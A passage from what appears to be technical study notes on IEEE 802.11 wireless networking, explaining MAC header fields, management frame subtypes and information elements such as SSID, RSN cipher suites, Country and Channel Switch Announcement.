<tr><td style="text-align: center"><code>10</code></td><td style="text-align: center">Data</td></tr>
<tr><td style="text-align: center"><code>11</code></td><td style="text-align: center">Extension</td></tr>
</tbody></table>
</div>
<p>Each frame type has its own subtypes and the particular one for the frame is specified in the 4-bit <code>Subtype</code> field. </p>
<p>Following are the <code>To Distribution System (ToDS)</code> and the <code>From Distribution System (FromDS)</code> 1-bit fields. They indicate whether traffic is travelling from or to the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/(1)%20The%20Physical%20Layer.html#the-distribution-system">Distribution System</a>. However, it is really the combination of these bits that is interpreted as meaningful:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">To DS</th><th style="text-align: center">From DS</th><th style="text-align: center">Meaning</th></tr></thead><tbody>
<tr><td style="text-align: center">0</td><td style="text-align: center">0</td><td style="text-align: center">Station-to-station communication in an <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/(1)%20The%20Physical%20Layer.html#independent-basic-service-set-ibss">IBSS</a>.</td></tr>
<tr><td style="text-align: center">0</td><td style="text-align: center">1</td><td style="text-align: center">Traffic from AP to station (exiting the DS).</td></tr>
<tr><td style="text-align: center">1</td><td style="text-align: center">0</td><td style="text-align: center">Traffic from station to AP (entering the DS).</td></tr>
<tr><td style="text-align: center">1</td><td style="text-align: center">1</td><td style="text-align: center">Traffic from AP to AP (<a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/(1)%20The%20Physical%20Layer.html#workgroup-bridge">wireless bridging</a>).</td></tr>
</tbody></table>
</div>
<p>Next is the <code>More Fragments</code> field. If a datagram was fragmented into multiple frames, this field will be set to 1 for all frames except the last one. </p>
<p>Afterwards comes the <code>Retry</code> field. A value of 1 indicates that this frame is a <em>retransmission</em> of a frame which did not receive a confirmation (ACK).</p>
<p>The <code>Power Management</code> field is set to 1 if the station uses power saving mode, which means that periodically shuts down some of its components to preserve power. Frames with this bit set but no actual data are used to inform the AP of the station's power saving mode. The AP will then buffer frames intended for this client.</p>
<p>The <code>More Data</code> field indicates whether or not the AP has more buffered frames to send to a station in power saving mode. Receiving a frame with this bit set to 1 which cause the station to wait to receive all frames from the AP before proceeding with its power saving shenanigans. </p>
<p>The <code>Protected Frame</code> bit is set to 1 when the payload of the frame is encrypted and is 0 otherwise. </p>
<p>Finally, the <code>Order</code> bit should be set to 0 for all frames with the exception of non-QoS data frames. In this case, this bit is set to 1 if a request from a higher layer for the data to be sent using a strictly ordered Class of Service. This tells the receiving station to process the frames in order.</p>
<h2 id="duration--id"><a class="header" href="#duration--id">Duration / ID</a></h2>
<p>The Duration / ID is interpreted differently depending on the message type and can either serve as the time (in microseconds, μs) the channel will be dedicated for the transmission of the frame, or an association ID. The latter is only the case in PS-Poll in Legacy Power Management.</p>
<p>When a station receives a frame from another station, it looks at the Duration and sets an internal timer based on it (called a NAV). The station knows that the channel will be busy until the timer reaches 0. Note that the frame's receiver does not update their NAV and the NAV is set to 0 for the frame's sender.</p>
<p>The duration value always refers to the time that will be spent for both the transmission of the frame <em>and its acknowledgment.</em> Thus, the transmitter of the frame will also need to calculate the time it will take to receive an ACK frame. This ACK will have a duration of 0, since the duration field in the original frame already accounts for its transmission time.</p>
<p>The duration for any frame sent during the contention-free period in a PCF is set to <code>0x8000</code>.</p>
<h2 id="address-1-2-3--4"><a class="header" href="#address-1-2-3--4">Address 1, 2, 3 &amp; 4</a></h2>
<p>There can be between 1 and 4 MAC addresses in a 802.11 frame. Which addresses are present and their order depend on the message type. An address can be one of the following:</p>
<ul>
<li><strong>Destination Address (DA)</strong> - the ultimate destination of the frame</li>
<li><strong>Source Address (SA)</strong> - the original sender of the frame</li>
<li><strong>Receiver Address (RA)</strong> - the immediate receiver of the frame</li>
<li><strong>Transmitter Address (TA)</strong> - the immediate sender of the frame</li>
</ul>
<h2 id="sequence-control"><a class="header" href="#sequence-control">Sequence Control</a></h2>
<p>This 16-bit field is further separated into two fields. The first 4 bits are called the <em>fragment number</em> and the other 12 are called the <em>sequence number</em>. Each frame sent by a particular station must have a different sequence number from rest of the frames sent by this station. When a frame is too large and gets fragmented, the fragment number begins at 0 and is incremented for every fragment.</p>
<h2 id="qos-control"><a class="header" href="#qos-control">QoS Control</a></h2>
<p>This 16-bit field is used for Quality of Service control and is only present in data frames of type QoS-data. It is further subdivided into 5 subfields.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/MAC_Header_QoS.svg" alt="" /></p>
<p>The first 4 bits are the <code>Traffic Indicator (TID)</code> and it identifies the User Priority (UP) which map to their 802.1Q equivalents. Furthermore, the User Priorities are categorised into 4 QoS Access Categories (AC). 802.11 uses the Enhanced Distributed Channel Access (EDCA) model where each Access Category is mapped to a different queue.</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">User Priority (UP) Value</th><th style="text-align: center">802.1Q CoS Class</th><th style="text-align: center">Access Category (AC)</th><th style="text-align: center">Designation</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><code>BK</code></td><td style="text-align: center"><code>AC_BK</code></td><td style="text-align: center">Background</td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center">-</td><td style="text-align: center"><code>AC_BK</code></td><td style="text-align: center">Background</td></tr>
<tr><td style="text-align: center">0</td><td style="text-align: center"><code>BE</code></td><td style="text-align: center"><code>AC_BE</code></td><td style="text-align: center">Best Effort</td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center"><code>BE</code></td><td style="text-align: center"><code>AC_BE</code></td><td style="text-align: center">Best Effort</td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><code>CL</code></td><td style="text-align: center"><code>AC_VI</code></td><td style="text-align: center">Video</td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><code>VI</code></td><td style="text-align: center"><code>AC_VI</code></td><td style="text-align: center">Video</td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center"><code>VO</code></td><td style="text-align: center"><code>AC_VO</code></td><td style="text-align: center">Voice</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center"><code>NC</code></td><td style="text-align: center"><code>AC_VO</code></td><td style="text-align: center">Voice</td></tr>
</tbody></table>
</div>
<p>The actual priority level increases from top to bottom. </p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Access Category (AC)</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">Voice</td><td>The highest priority. It allows for multiple concurrent VoIP calls with low latency and good voice quality.</td></tr>
<tr><td style="text-align: center">Video</td><td>Supports prioritised video traffic.</td></tr>
<tr><td style="text-align: center">Best Effort</td><td>For traffic from devices which cannot provide QoS capabilities and isn't as sensitive to latency but is affected by big delays, such as Web Browsing.</td></tr>
<tr><td style="text-align: center">Background</td><td>Low-priority traffic with no strict throughput or latency requirements such as file transfers.</td></tr>
</tbody></table>
</div>
<p>The <code>End of Service Period (EOSP)</code> field is 1 bit in length. When set to 1, it indicates that a client in power saving mode may go to sleep.</p>
<p>The next two bits indicate the Acknowledgement Policy (<code>ACK Policy</code>) and have four possible variants - ACK, No ACK, No Explicit ACK, and Block ACK.</p>
<p>The next bit is reserved for future use.</p>
<p>Bits 8-15 are used to indicate 4 things:</p>
<ul>
<li><code>TXOP Limit</code> - this is the transmission operation limit provided by the AP.</li>
<li><code>AP PS Buffer Size</code> - the AP uses this to indicate the PS buffer state for a given client.</li>
<li><code>TXOP Duration Requested</code> - the transmission operation duration desired by the client for its next transmission. The AP may grant less.</li>
<li><code>Queue Size</code> - used by the client to inform the AP of how much buffered traffic it has to send. The AP can use this information to calculate the time necessary for the next transmission to this client.</li>
</ul>
<h2 id="ht-control"><a class="header" href="#ht-control">HT Control</a></h2>
<p>This field was introduced in the 802.11n standard and enable high-throughput operations.</p>
<h2 id="frame-check-sequence-fcs"><a class="header" href="#frame-check-sequence-fcs">Frame Check Sequence (FCS)</a></h2>
<p>Similarly to Ethernet, this field is used to verify the integrity of the rest of the frame.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-53"><a class="header" href="#introduction-53">Introduction</a></h1>
<p>Management frames render the service of managing the Service Set. They have 3 addresses in their MAC header, which is 24 bytes in size for 802.11a/b/g/, and 28 bytes for 802.11n (additional 4 bytes for the HT Control field). Their type in the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../index.html#frame-control">Frame Control</a> is indicated by <code>00</code>. Moreover, management frames are never forwarded to the DS, so they have the <code>FromDS</code> and <code>ToDS</code> bits set to 0 in their Frame Control. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Management_Frame.svg" alt="" /></p>
<p>The source and destination MAC addresses are self-explanatory. The third address is the BSS ID which can either be the MAC of the AP or a wildcard value (for probe requests). If 802.11n is used, there is also an HT Control field in the MAC header. The frame body (payload) is comprised of fixed-size fields and variable-size information elements.</p>
<p>There are 12 subtypes of management frames:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Subtype Bits</th><th style="text-align: center">Meaning</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>0000</code></td><td style="text-align: center">Association Request</td></tr>
<tr><td style="text-align: center"><code>0001</code></td><td style="text-align: center">Association Response</td></tr>
<tr><td style="text-align: center"><code>0010</code></td><td style="text-align: center">Reassociation Request</td></tr>
<tr><td style="text-align: center"><code>0011</code></td><td style="text-align: center">Reassociation Response</td></tr>
<tr><td style="text-align: center"><code>0100</code></td><td style="text-align: center">Probe Request</td></tr>
<tr><td style="text-align: center"><code>0101</code></td><td style="text-align: center">Probe Response</td></tr>
<tr><td style="text-align: center"><code>1000</code></td><td style="text-align: center">Beacon Frame</td></tr>
<tr><td style="text-align: center"><code>1001</code></td><td style="text-align: center">Announcement Traffic Indication Message (ATIM)</td></tr>
<tr><td style="text-align: center"><code>1010</code></td><td style="text-align: center">Disassociation Frame</td></tr>
<tr><td style="text-align: center"><code>1011</code></td><td style="text-align: center">Authentication Frame</td></tr>
<tr><td style="text-align: center"><code>1100</code></td><td style="text-align: center">Deauthentication Frame</td></tr>
<tr><td style="text-align: center"><code>1101</code></td><td style="text-align: center">Action Frame</td></tr>
<tr><td style="text-align: center"><code>1110</code></td><td style="text-align: center">Action - no ACK</td></tr>
</tbody></table>
</div>
<h1 id="management-frame-fields"><a class="header" href="#management-frame-fields">Management Frame Fields</a></h1>
<p>These are fixed-size fields and are typically located at the beginning of the management frame's body.</p>
<h2 id="capability-information"><a class="header" href="#capability-information">Capability Information</a></h2>
<p>This is a complex 2-byte field which indicates request or advertised capabilities. This field is present in beacon, probe response, association request, association response, reassociation request, and reassociation response frames.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Capability_Information.svg" alt="" /></p>
<p>The <code>ESS</code> &amp; <code>IBSS</code> fields are mutually exclusive. The ESS bit indicates whether the frame is coming from an AP (1) or not (0) and the IBSS fields indicates whether or not the frame is coming form an IBSS station (1) or not (0).</p>
<p>The <code>Privacy</code> field is set to 1 if data confidentiality (AES, TKIP, or WEP) is required and is set to 0 otherwise. The encryption type is actually determined by the RSN field.</p>
<p><code>Short Preamble</code> is set to 1 if short preambles are supported.</p>
<p><code>Channel Agility</code> is an optional feature introduced by 802.11b. Its purpose was to reduce interference by periodically shifting the channel up and down a bit but it was never widely adopted.</p>
<p><code>Spectrum Management</code> is set to 1 to reflect DFS and TPC support.</p>
<p><code>QoS</code> is set to 1 if the AP supports QoS and is seto to 0 otherwise.</p>
<p><code>Short Slot Time</code> is used to indicate whether Short Slot Time (9 μs) is used. This indicates that 802.11b is not supported by the AP, since this standard only uses Standard Slot Time (20 μs). If an 802.11b client joins the network, Short Slot Time should be disabled across the entire network until the 802.11b device leaves. Thus, all following frames should have this bit set to 0. For 802.11a, this bit is always set to 0, since Standard Slot Time is not supported, so there is no &quot;long&quot; and therefore no &quot;short&quot; time.</p>
<p>If the <code>APSD</code> set is set to 1, then the AP supports the eponymous feature. If this is set to 0, then the AP only supports Legacy Power Saving Mode. Frames originating from client should always have this bit set to 0, due to network-wide nature of this feature.</p>
<p><code>DSSS-OFDM</code> provides 54 Mbps speeds in 802.11b/g-<br />
compatible networks. When this bit is set to 1, the DSSS-OFDM mode is allowed.<br />
When the bit is set to 0, this mode is not allowed. This bit is always set to 0 for 802.11a networks.</p>
<h2 id="status-code-field"><a class="header" href="#status-code-field">Status Code Field</a></h2>
<p>This is a 2-byte long field present in Response frames. If set to 0, then the request was successful. Otherwise, the field contains the failure code, where 1 indicates an unspecified failure.</p>
<h2 id="reason-code-field"><a class="header" href="#reason-code-field">Reason Code Field</a></h2>
<p>This 2-byte field is used to indicate the reason that an unsolicited notification man-<br />
agement frame of type disassociation, deauthentication, DELTS, DELBA, or DLS teardown<br />
was generated. It is only present in frames of the above types when such a frame is sent to a station without the client asking.</p>
<h1 id="management-frame-information-elements"><a class="header" href="#management-frame-information-elements">Management Frame Information Elements</a></h1>
<p>Manage frames can contain Management Frame Information Elements which are variable-length components and they may or may not be present. The typical structure of an MFIE is an element ID, followed by a length, and then the actual payload. The element ID and the length fields are both 1 bytes long, while the payload may range from 0 to 32 bytes. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/MFIE.svg" alt="" /></p>
<p>The following Element IDs are defined:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Element ID</th><th style="text-align: center">Name</th></tr></thead><tbody>
<tr><td style="text-align: center">0</td><td style="text-align: center">Service Set Identity (SSID)</td></tr>
<tr><td style="text-align: center">1</td><td style="text-align: center">Supported Rates</td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center">FH Parameter Set</td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center">DS Parameter Set</td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center">CF Parameter Set</td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center">Traffic Indication Map (TIM)</td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center">IBSS Parameter Set</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center">Country</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">Hopping Pattern Parameters</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center">Hopping Pattern Table</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center">Request Information</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center">BSS Load</td></tr>
<tr><td style="text-align: center">12 - 15</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">Challenge Text</td></tr>
<tr><td style="text-align: center">17 - 31</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center">32</td><td style="text-align: center">Power Constraint</td></tr>
<tr><td style="text-align: center">33</td><td style="text-align: center">Power Capability</td></tr>
<tr><td style="text-align: center">34</td><td style="text-align: center">Transmit Power Control (TPC) Request</td></tr>
<tr><td style="text-align: center">35</td><td style="text-align: center">TPC Report</td></tr>
<tr><td style="text-align: center">36</td><td style="text-align: center">Supported Channels</td></tr>
<tr><td style="text-align: center">37</td><td style="text-align: center">Channel Switch Announcement</td></tr>
<tr><td style="text-align: center">38</td><td style="text-align: center">Measurement Request</td></tr>
<tr><td style="text-align: center">39</td><td style="text-align: center">Measurement Report</td></tr>
<tr><td style="text-align: center">40</td><td style="text-align: center">Quiet</td></tr>
<tr><td style="text-align: center">41</td><td style="text-align: center">IBSS DFS</td></tr>
<tr><td style="text-align: center">42</td><td style="text-align: center">ERP Information</td></tr>
<tr><td style="text-align: center">43 - 47</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center">48</td><td style="text-align: center">Robust Security Network (RSN)</td></tr>
<tr><td style="text-align: center">49</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center">50</td><td style="text-align: center">Extended Supported Rates</td></tr>
<tr><td style="text-align: center">51 - 220</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center">221</td><td style="text-align: center">WPA</td></tr>
<tr><td style="text-align: center">222 - 255</td><td style="text-align: center">Reserved</td></tr>
</tbody></table>
</div>
<h2 id="ssid"><a class="header" href="#ssid">SSID</a></h2>
<p>The SSID element is present in all beacons, probe requests, probe responses, association<br />
requests, and reassociation requests. It has an Element ID of 0. Its length is the length of the SSID string. The SSID string is encoded one character per byte and has a maximum length of 32.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/SSID_MFIE.svg" alt="" /></p>
<h2 id="supported-rates--extended-supported-rates"><a class="header" href="#supported-rates--extended-supported-rates">Supported Rates &amp; Extended Supported Rates</a></h2>
<p>This element is present in beacons, probe requests, probe responses, and all<br />
association frames. Its component is comprised of a maximum of 8 bytes where each byte describes a single supported rate. Each rate takes the following format in a byte. The last bit is set to 1 if the rate is basic (mandatory) and to 0 if there is simply support for it. The rest of the bits described the data rate in multiples of 500 Kbps. A station willing to join the network must support all the mandatory rates.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Supported_Rates_MFIE.svg" alt="" /></p>
<p>If there are more than 8 supported rates, then an Extender Rates Element is also present. This Element can describe up to 255 additional rates in the same fashion as the Supported Rates Element.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Extended_Supported_Rates_MFIE.svg" alt="" /></p>
<h2 id="robust-security-network-rsn"><a class="header" href="#robust-security-network-rsn">Robust Security Network (RSN)</a></h2>
<p>This element has an ID of 48. It is present in present in beacons, probe responses,<br />
association responses, and reassociation responses, and is utilised with WPA/2/3 in order to determine the authentication and encryption mechanism in use. RSN has several subfields and its length depends on the number of supported mechanisms.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/RSN_MFIE.svg" alt="" /></p>
<p>The <code>Version</code> subfield is 2 bytes in length and always set to 1.</p>
<p>Next is the <code>Group Cipher Suite</code> descriptor. The first three bytes are an OUI of the vendor (<code>00:0F:AC</code> for 802.11) and the last byte is the suite type. Following is a table of the cipher suites.</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">OUI</th><th style="text-align: center">Suite Type</th><th style="text-align: center">Description</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">0</td><td style="text-align: center">Use the group cipher suite (for pairwise ciphers only).</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">1</td><td style="text-align: center">WEP-40</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">2</td><td style="text-align: center">TKIP</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">3</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">4</td><td style="text-align: center">CCMP-128</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">5</td><td style="text-align: center">WEP-104</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">6</td><td style="text-align: center">BIP-CMAC-128</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">7</td><td style="text-align: center">Reserved</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">8</td><td style="text-align: center">GCMP-128</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">9, 10</td><td style="text-align: center">GCMP-256</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">11</td><td style="text-align: center">BIP-GMAC-128</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">12, 13</td><td style="text-align: center">BIP-GMAC-256</td></tr>
</tbody></table>
</div>
<p>Next is a 2-byte <code>Pairwise Cipher Suite Count</code> which indicates how many ciphers are in the next field. Each cipher is described by 4 bytes in the <code>Pairwise Cipher Suite List</code>.</p>
<p>The next two fields are similar to the Pairwise Cipher Suite fields, but describe the mechanisms supported for authentication (Authentication &amp; Key Management). The <code>AKM Suite Count</code> defines the number of methods supported. Each method is described by 4 bytes in the <code>AKM Suite List</code>, where the first 3 bytes are again an OUI. </p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">OUI</th><th style="text-align: center">Suite Type</th><th style="text-align: center">Authentication</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">1</td><td style="text-align: center">802.1X or PMK Caching</td></tr>
<tr><td style="text-align: center"><code>00:0F:AC</code></td><td style="text-align: center">2</td><td style="text-align: center">Pre-shared Key (PSK)</td></tr>
<tr><td style="text-align: center">Vendor OUI</td><td style="text-align: center">Any</td><td style="text-align: center">Vendor-specific</td></tr>
</tbody></table>
</div>
<p>The <code>RSN Capabilities</code> is a 2-byte field. The first 4 bits are flags and the rest must be set to 0. The <code>Preauthentication</code> bit is set by an AP to indicate that it supports preauthentication with other APs in order to move security sessions around. The <code>No Pairwise</code> bit is set station can support a manual WEP key for broadcast data in conjunction with a stronger unicast key, but this should not be used. </p>
<p>The last two fields, <code>PMKID Count</code> and <code>PMKID List</code>, describe a list of PMKs which a client may send to an AP during association in order to speed up the process by bypassing time-consuming authentication. This only works if the AP caches PMKs. </p>
<h2 id="direct-sequence-ds-parameter-set"><a class="header" href="#direct-sequence-ds-parameter-set">Direct Sequence (DS) Parameter Set</a></h2>
<p>The DS Parameter Set element in used both by DSSS and OFDM system, on both 2.4 GHz and 5 GHz bands. It is a simple field with an important task - it indicates the current channel.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/DS_Parameter_Set_MFIE.svg" alt="" /></p>
<p>Since 802.11 signals are spread across multiple channel, this indicates the channel that the sender is centering their transmission on.
When 802.11n is employed with channel bonding, the secondary channel is indicated in several 802.11n-specific field such as the Secondary Channel element or the 20/40 IBSS Coexistence element.</p>
<h2 id="bss-load"><a class="header" href="#bss-load">BSS Load</a></h2>
<p>This element is used only when QoS is supported (when the QoS subfield in the Capability<br />
Information element is enabled) and is often additionally called QBSS Load. It provides information about the network load and is typically sent by APs. Stations avail themselves of this field in order to determine how to <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../../../The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/(1)%20The%20Physical%20Layer.html#extended-service-set-ess">roam</a>.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/BSS_Load_MFIE.svg" alt="" /></p>
<p>The <code>Station Count</code> is an integer indicating the number of stations currently connected to the network.</p>
<p>The <code>Channel Utilisation</code> field is the percentage of time, normalised to 255, that the AP sensed the medium was busy. An AP senses the medium every slot time. At regular inter- vals (every 50 beacons by default)), the AP looks over the last period and counts how many times the<br />
network was seen as busy and how many times it was seen as idle. A simple percentage is then calculated and translated into a 0 to 255 range.</p>
<h2 id="enhanced-distributed-channel-access-edca-parameter"><a class="header" href="#enhanced-distributed-channel-access-edca-parameter">Enhanced Distributed Channel Access (EDCA) Parameter</a></h2>
<p>This element is used only when QoS is supported. In most QoS-enabled networks, this<br />
field is not used, and the same information is provided through the WMM or the WME<br />
vendor-specific elements.</p>
<h2 id="qos-capability"><a class="header" href="#qos-capability">QoS Capability</a></h2>
<p>This element is used only when QoS is supported. It is used as a conjugate to the EDCA<br />
Parameter element when EDCA Parameter is not present. Furthermore, It is utilised by the AP to transmit QoS information to the network. It is a shorter version of the EDCA Parameter Set<br />
element and contains only the QoS information section. In most QoS-enabled networks,<br />
this field is not used, and the same information is provided through the WMM or the<br />
WME vendor-specific elements.</p>
<h2 id="ibss-dfs"><a class="header" href="#ibss-dfs">IBSS DFS</a></h2>
<p>IBSSs require a designated owner for the dynamic frequency selection (DFS) algorithm. Thus, this element may be transmitted by management frames in an IBSS.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/IBSS_DFS_MFIE.svg" alt="" /></p>
<p>The <code>DFS Owner</code> field contains the MAC address of the, well, DFS owner. Should this owner disappear or be lost during a hop, the <code>DFS Recovery Interval</code> will contain a timeout (in TBTTs or beacon intervals) for how long a station not hearing from the DFS owner should wait before selecting its own channel and assuming the role of a DFS owner itself.</p>
<p>The last field is a <code>Channel Map</code> which is a series of members which report what is detected on each channel. A channel map member consists of two bytes - one for the channel number and one for the actual information.</p>
<p>The latter byte is split into five subfields - the last three bits are reserved. The <code>BSS</code> bit will be set to 1 if frames from another network are detected during a measurement period. The <code>OFDM Preamble</code> bit is set if the 802.11a short training sequence is detected, but without being followed by the rest of the frame. The <code>Unidentified Signal</code> bit is set to 1 when the received power is high, but the signal cannot be classified as either a 802.11 network, an OFDM network, or a radar signal. The <code>Radar</code> bit is set to 1 if a radar signal was received during the measurement period. The <code>Unmeasured</code> bit is set to 1 if the channel wasn't measured. In this case, all other bits will naturally be 0.</p>
<h2 id="country"><a class="header" href="#country">Country</a></h2>
<p>Since each country is allowed to regulate the allowed channels and power levels, a mechanism was invented for networks to describe these limitations to new stations instead of ceaselessly updating drivers.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Country_MFIE.svg" alt="" /></p>
<p>The <code>Country String</code> is a 3-byte ASCII string representing the country of operation. The first two characters are the country's ISO code and the last character is either set to &quot;I&quot; or &quot;O&quot; which distinguishes between indoor and outdoor regulations, respectively.</p>
<p>The rest of the country MFIE is composed of <code>Constraint Triplets</code>. The <code>First Channel</code> field signifies the lowest channel subject to the power constraint. Next is the <code>Number of Channels</code> in the band that are subject to the power constraint. Ultimately comes the <code>Max Transmit Power</code> which indicates the maximum transmission power allowed, in dBm.</p>
<p>The size of the information element must be an even number. Otherwise, a <code>Padding</code> byte full of 0s is appended.</p>
<h2 id="power-constraint"><a class="header" href="#power-constraint">Power Constraint</a></h2>
<p>Under 802.11h, stations operating in the 5 GHz bands should reduce their power level so as to avoid creating interference with other devices using the same spectrum. This is referred to as &quot;satellite services&quot;, but is so far implemented only to avoid interference with civilian airport radars in the UNII-2 and UNII-2 extended bands. In this field, the AP indicates how much lower than the maximum power indicated by the Country element participants should strive for.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Power_Constraint_MFIE.svg" alt="" /></p>
<p>The <code>Local Power Constraint</code> field is the reduction of power, in dBm, from the one in the Country element that stations should strive for. If the Country element designated 10 dBm as the maximum and this field contains 4 dBm, then the stations should ultimately strive for a signal power of 6 dBm.</p>
<h2 id="power-capability"><a class="header" href="#power-capability">Power Capability</a></h2>
<p>This field allows a station to report its minimum and maximum transmission power in dBm.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Power_Capability_MFIE.svg" alt="" /></p>
<h2 id="tpc-report"><a class="header" href="#tpc-report">TPC Report</a></h2>
<p>The attenuation of the link is useful to stations seeking to adjust their transmission power. This field typically serves as a response to a <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#tpc-request">TPC Request</a>. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/TPC_Report_MFIE.svg" alt="" /></p>
<p>The <code>Transmit Power</code> indicates the transmission power, in dBm, used to transmit the frame containing the element. The <code>Link Margin</code> is another field which contains the number of decibels that are required by the sending station for safety.</p>
<h2 id="supported-channels"><a class="header" href="#supported-channels">Supported Channels</a></h2>
<p>This field describes the channel sub-bands supported by the device. After the element header follows a series of <em>sub-band descriptors</em>. The first member of the descriptor is the lowest channel supported in the sub-band. The second subfield describes the number of supported channels, beginning with the <code>First Channel</code>.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Supported_Channels_MFIE.svg" alt="" /></p>
<p>If a station supported channels 20 through 36, then it would have the above fields set to 20 and 16, respectively.</p>
<h2 id="channel-switch-announcement"><a class="header" href="#channel-switch-announcement">Channel Switch Announcement</a></h2>
<p>With the advent of 802.11h, a feature for dynamic channel switching was implemented. Therefore, management frames may include this element in order to warn stations about the impending channel switch.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Channel_Switch_Announcement_MFIE.svg" alt="" /></p>
<p>When the channel is switched, communications are disrupted. If the <code>Switch Mode</code> is set to 1, then associated stations should cease transmission until the switch occurs. If set to 0, no restrictions are placed on transmission.</p>
<p>The <code>New Channel</code> field indicates the number of the channel to switch to.</p>
<p>Channel switching can be scheduled. The <code>Switch Count</code> indicates the number of <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">TBTTs</a> that it will take before the channel is changed. The channel switch occurs at the nick of time before the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">beacon frame</a> is sent. If this field is set to 0, then the channel switch may occur without further warning.</p>
<h2 id="quiet"><a class="header" href="#quiet">Quiet</a></h2>
<p>Under 802.11h, an AP can request a period of silence during which no station should transmit. This is done in order to detect possible radars and then possible issue a channel switch if such is found.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Quiet_MFIE.svg" alt="" /></p>
